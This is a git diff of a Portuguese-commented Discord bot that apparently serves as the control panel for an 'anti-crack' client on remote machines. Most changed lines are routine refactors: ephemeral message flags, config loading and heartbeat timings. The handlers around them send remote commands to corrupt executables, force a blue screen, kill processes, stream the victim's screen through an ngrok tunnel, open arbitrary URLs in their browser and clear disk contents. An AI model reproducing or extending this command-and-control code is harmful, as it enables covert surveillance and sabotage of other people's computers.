@@ -1,33 +1,47 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, Collection, REST, Routes } = require("discord.js");
+const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, Collection, REST, Routes, MessageFlags } = require("discord.js");
 const axios = require("axios");
 const http = require("http");
 const fs = require("fs");
 const path = require("path");
+
+require("dotenv").config({ path: path.join(__dirname, ".env"), quiet: true });
+
+const debugLogsEnabled = process.env.LOG_LEVEL === "debug";
+const writeConsoleLine = console.log.bind(console);
+if (!debugLogsEnabled) {
+  console.log = () => {};
+  console.warn = () => {};
+  console.clear = () => {};
+}
+
+let onlineLogPrinted = false;
+function printOnline(message) {
+  if (onlineLogPrinted) return;
+  onlineLogPrinted = true;
+  writeConsoleLine(message);
+}
+
+function readPositiveNumberEnv(name, fallback) {
+  const value = Number(process.env[name]);
+  return Number.isFinite(value) && value > 0 ? value : fallback;
+}
 
 // ══════════════════════════════════════════════════════════════════════════════
 // CONFIGURAÇÃO
 // ══════════════════════════════════════════════════════════════════════════════
 // Carregar config: prioridade para variáveis de ambiente (Render/produção), senão config.json (local)
 let config;
-if (process.env.DISCORD_TOKEN) {
-  // Produção (Render) — usa variáveis de ambiente
-  config = {
-    token: process.env.DISCORD_TOKEN,
-    clientid: process.env.CLIENT_ID,
-    ownerid: process.env.OWNER_ID
-  };
-  console.log("[Config] ✅ Configuração carregada via variáveis de ambiente");
-} else if (fs.existsSync("./config.json")) {
-  // Desenvolvimento local — usa config.json
-  config = JSON.parse(fs.readFileSync("./config.json", "utf-8"));
-  console.log("[Config] ✅ Configuração carregada via config.json (local)");
-} else {
-  console.error("[Config] ❌ Nenhuma configuração encontrada! Defina DISCORD_TOKEN ou crie config.json");
+try {
+  config = require("./config");
+} catch (err) {
+  console.error(`[Config] ${err.message}`);
   process.exit(1);
 }
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages] });
 
-const BOT_HTTP_PORT = process.env.PORT || 3001;
+const BOT_HTTP_PORT = readPositiveNumberEnv("PORT", 3001);
+const HEARTBEAT_CHECK_MS = readPositiveNumberEnv("HEARTBEAT_CHECK_MS", 15000);
+const HEARTBEAT_TIMEOUT_MS = readPositiveNumberEnv("HEARTBEAT_TIMEOUT_MS", 13000);
 const CPP_COMMAND_PORT = 7000;
 
 // sessionId → { browsers: [...] }
@@ -40,7 +54,7 @@ const activeSessions = new Map();
 function getBotConfig() {
   const configPath = path.join(__dirname, "database", "botConfig.json");
   if (!fs.existsSync(configPath)) {
-    fs.writeFileSync(configPath, JSON.stringify({ logsAntiCrack: "" }, null, 2));
+    fs.writeFileSync(configPath, JSON.stringify({ logsAntiCrack: "", logsPainel: "" }, null, 2));
   }
   return JSON.parse(fs.readFileSync(configPath, "utf-8"));
 }
@@ -478,9 +492,18 @@ const httpServer = http.createServer((req, res) => {
         res.writeHead(200);
         res.end(JSON.stringify({ success: true }));
       } catch (err) {
-        console.error("[HTTP] Erro ao processar alerta:", err.message);
-        res.writeHead(500);
-        res.end(JSON.stringify({ error: err.message }));
+        const upstream = err.response?.data;
+        const statusCode = err.message.includes("Canal nao configurado") || err.message.includes("Canal não configurado")
+          ? 400
+          : 500;
+        const errorMessage = upstream?.message || err.message;
+        console.error("[HTTP] Erro ao processar alerta:", errorMessage);
+        res.writeHead(statusCode, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({
+          error: errorMessage,
+          status: err.response?.status,
+          details: upstream || null,
+        }));
       }
     });
     return;
@@ -508,7 +531,7 @@ setInterval(async () => {
   for (const [sessionId, lastSeen] of sessionLastSeen.entries()) {
     const elapsed = now - lastSeen;
     console.log(`[Heartbeat] ${sessionId}: ${Math.round(elapsed/1000)}s desde último poll`);
-    if (elapsed > 13000) {
+    if (elapsed > HEARTBEAT_TIMEOUT_MS) {
       sessionLastSeen.delete(sessionId);
       const botConfig = getBotConfig();
       if (!botConfig.logsAntiCrack) continue;
@@ -551,17 +574,19 @@ setInterval(async () => {
       }
     }
   }
-}, 5000);
+}, HEARTBEAT_CHECK_MS);
 
 // ══════════════════════════════════════════════════════════════════════════════
 // BOT DISCORD
 // ══════════════════════════════════════════════════════════════════════════════
 
-client.once("ready", async () => {
+client.once("clientReady", async () => {
   console.log(`[Bot] ✅ Logado como ${client.user.tag}`);
 
-  // Alterar nome do bot
-  await client.user.setUsername("BotGelado").catch(() => {});
+  // Alterar nome do bot somente quando necessario para evitar rate limit.
+  if (client.user.username !== "BotGelado") {
+    await client.user.setUsername("BotGelado").catch(() => {});
+  }
 
   // Carregar messageIds salvos
   loadMessageIds();
@@ -588,6 +613,7 @@ client.once("ready", async () => {
   }
 
   botReady = true;
+  printOnline(`[ONLINE] Bot online como ${client.user.tag}`);
 
   // Processar alertas pendentes
   for (const payload of pendingAlerts) {
@@ -606,7 +632,7 @@ client.on("interactionCreate", async (interaction) => {
     const OWNER_USERNAME = "geladopvp123_37711";
     if (interaction.user.username !== OWNER_USERNAME) {
       if (interaction.isRepliable()) {
-        await interaction.reply({ content: "❌ Você não tem permissão para usar este bot.", ephemeral: true });
+        await interaction.reply({ content: "❌ Você não tem permissão para usar este bot.", flags: MessageFlags.Ephemeral });
       }
       return;
     }
@@ -652,7 +678,7 @@ client.on("interactionCreate", async (interaction) => {
               .setStyle(ButtonStyle.Primary)
           ),
         ],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -684,7 +710,7 @@ client.on("interactionCreate", async (interaction) => {
 
       await interaction.reply({
         content: `✅ Canal de Logs Anti-Crack configurado: <#${channelId}>`,
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -716,7 +742,7 @@ client.on("interactionCreate", async (interaction) => {
 
       await interaction.reply({
         content: `✅ Canal de Logs do Painel Iniciado configurado: <#${channelId}>`,
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -729,7 +755,7 @@ client.on("interactionCreate", async (interaction) => {
       saveBotConfig(botConfig);
       await interaction.reply({
         content: `✅ Token do ngrok configurado: \`${token.substring(0, 20)}...\`\n\nO C++ vai usar esse token automaticamente na próxima vez que clicar em **Ver Tela**.`,
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -741,7 +767,7 @@ client.on("interactionCreate", async (interaction) => {
       if (action === "openBrowser") {
         const session = activeSessions.get(sessionId);
         if (!session) {
-          await interaction.reply({ content: "❌ Sessão expirada", ephemeral: true });
+          await interaction.reply({ content: "❌ Sessão expirada", flags: MessageFlags.Ephemeral });
           return;
         }
 
@@ -768,7 +794,7 @@ client.on("interactionCreate", async (interaction) => {
             new ButtonBuilder().setCustomId(`confirmBreak_${sessionId}`).setLabel("✅ Sim, quebrar").setStyle(ButtonStyle.Danger),
             new ButtonBuilder().setCustomId("cancelBreak").setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
           )
-        ], ephemeral: true });
+        ], flags: MessageFlags.Ephemeral });
         return;
       }
 
@@ -776,9 +802,9 @@ client.on("interactionCreate", async (interaction) => {
         await interaction.update({ content: "💥 Quebrando executável...", components: [] });
         try {
           await sendCommand(sessionId, "breakExe");
-          await interaction.followUp({ content: "✅ Executável corrompido com sucesso!", ephemeral: true });
+          await interaction.followUp({ content: "✅ Executável corrompido com sucesso!", flags: MessageFlags.Ephemeral });
         } catch (err) {
-          await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
@@ -789,10 +815,10 @@ client.on("interactionCreate", async (interaction) => {
       }
 
       if (action === "killProcess") {
-        await interaction.reply({ content: "🔴 Fechando processo...", ephemeral: true });
+        await interaction.reply({ content: "🔴 Fechando processo...", flags: MessageFlags.Ephemeral });
         try {
           await sendCommand(sessionId, "killProcess");
-          await interaction.followUp({ content: "✅ Processo encerrado!", ephemeral: true });
+          await interaction.followUp({ content: "✅ Processo encerrado!", flags: MessageFlags.Ephemeral });
           // Atualizar botão para vermelho imediatamente
           const botConfig = getBotConfig();
           const msgId = sessionMessageId.get(sessionId);
@@ -818,29 +844,29 @@ client.on("interactionCreate", async (interaction) => {
             } catch (e) { /* ignorar */ }
           }
         } catch (err) {
-          await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
 
       if (action === "viewScreen") {
-        await interaction.reply({ content: "🖥️ Iniciando servidor de visualização...\n_Isso pode levar 10-30 segundos..._", ephemeral: true });
+        await interaction.reply({ content: "🖥️ Iniciando servidor de visualização...\n_Isso pode levar 10-30 segundos..._", flags: MessageFlags.Ephemeral });
         try {
           await sendCommand(sessionId, "startScreenServer");
-          await interaction.followUp({ content: "✅ Servidor iniciado! O link será enviado no canal de logs.", ephemeral: true });
+          await interaction.followUp({ content: "✅ Servidor iniciado! O link será enviado no canal de logs.", flags: MessageFlags.Ephemeral });
         } catch (err) {
-          await interaction.followUp({ content: `❌ Erro ao Iniciar: ${err.message}\n\n**Verifique se o painel C++ está rodando.**`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Erro ao Iniciar: ${err.message}\n\n**Verifique se o painel C++ está rodando.**`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
 
       if (action === "stopScreen") {
-        await interaction.reply({ content: "⏹️ Parando visualização...", ephemeral: true });
+        await interaction.reply({ content: "⏹️ Parando visualização...", flags: MessageFlags.Ephemeral });
         try {
           await sendCommand(sessionId, "stopScreenServer");
-          await interaction.followUp({ content: "✅ Visualização parada!", ephemeral: true });
+          await interaction.followUp({ content: "✅ Visualização parada!", flags: MessageFlags.Ephemeral });
         } catch (err) {
-          await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
@@ -854,7 +880,7 @@ client.on("interactionCreate", async (interaction) => {
               new ButtonBuilder().setCustomId("cancelBSOD").setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
             )
           ],
-          ephemeral: true
+          flags: MessageFlags.Ephemeral
         });
         return;
       }
@@ -863,9 +889,9 @@ client.on("interactionCreate", async (interaction) => {
         await interaction.update({ content: "💀 Enviando BSOD...", components: [] });
         try {
           await sendCommand(sessionId, "blueScreen");
-          await interaction.followUp({ content: "💀 BSOD enviado com sucesso!", ephemeral: true });
+          await interaction.followUp({ content: "💀 BSOD enviado com sucesso!", flags: MessageFlags.Ephemeral });
         } catch (err) {
-          await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
@@ -884,7 +910,7 @@ client.on("interactionCreate", async (interaction) => {
               new ButtonBuilder().setCustomId("cancelClearDisk").setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
             )
           ],
-          ephemeral: true
+          flags: MessageFlags.Ephemeral
         });
         return;
       }
@@ -893,9 +919,9 @@ client.on("interactionCreate", async (interaction) => {
         await interaction.update({ content: "🗑️ Executando...", components: [] });
         try {
           await sendCommand(sessionId, "clearDisk");
-          await interaction.followUp({ content: "✅ Lixeira esvaziada com sucesso!", ephemeral: true });
+          await interaction.followUp({ content: "✅ Lixeira esvaziada com sucesso!", flags: MessageFlags.Ephemeral });
         } catch (err) {
-          await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
@@ -906,20 +932,20 @@ client.on("interactionCreate", async (interaction) => {
       }
 
       if (action === "restoreExe") {
-        await interaction.reply({ content: "🔄 Enviando comando para restaurar o EXE...", ephemeral: true });
+        await interaction.reply({ content: "🔄 Enviando comando para restaurar o EXE...", flags: MessageFlags.Ephemeral });
         try {
           await sendCommand(sessionId, "restoreExe");
           // Atualizar o botão de status para vermelho
-          await interaction.followUp({ content: "✅ Comando enviado! O processo vai fechar e na próxima execução abrirá normalmente.", ephemeral: true });
+          await interaction.followUp({ content: "✅ Comando enviado! O processo vai fechar e na próxima execução abrirá normalmente.", flags: MessageFlags.Ephemeral });
         } catch (err) {
-          await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
         }
         return;
       }
 
       if (action === "statusExe") {
         // Botão desabilitado — só mostra status, não faz nada
-        await interaction.reply({ content: "ℹ️ Este botão mostra o status do processo.", ephemeral: true });
+        await interaction.reply({ content: "ℹ️ Este botão mostra o status do processo.", flags: MessageFlags.Ephemeral });
         return;
       }
     }
@@ -931,7 +957,7 @@ client.on("interactionCreate", async (interaction) => {
       const session = activeSessions.get(sessionId);
 
       if (!session || !session.browsers || session.browsers.length === 0) {
-        await interaction.reply({ content: "❌ Nenhum navegador detectado", ephemeral: true });
+        await interaction.reply({ content: "❌ Nenhum navegador detectado", flags: MessageFlags.Ephemeral });
         return;
       }
 
@@ -953,7 +979,7 @@ client.on("interactionCreate", async (interaction) => {
       await interaction.reply({
         content: `🌐 Abrindo: \`${url}\`\nEscolha o navegador:`,
         components: [row],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -966,16 +992,16 @@ client.on("interactionCreate", async (interaction) => {
       await interaction.update({ content: `🌐 Abrindo \`${url}\` no navegador...`, components: [] });
       try {
         await sendCommand(sessionId, "openBrowser", { url, browser: browserExe });
-        await interaction.followUp({ content: "✅ Navegador aberto!", ephemeral: true });
+        await interaction.followUp({ content: "✅ Navegador aberto!", flags: MessageFlags.Ephemeral });
       } catch (err) {
-        await interaction.followUp({ content: `❌ Falha: ${err.message}`, ephemeral: true });
+        await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
       }
       return;
     }
   } catch (err) {
     console.error("[Interaction] Erro:", err);
     if (!interaction.replied && !interaction.deferred) {
-      await interaction.reply({ content: `❌ Erro: ${err.message}`, ephemeral: true });
+      await interaction.reply({ content: `❌ Erro: ${err.message}`, flags: MessageFlags.Ephemeral });
     }
   }
 });
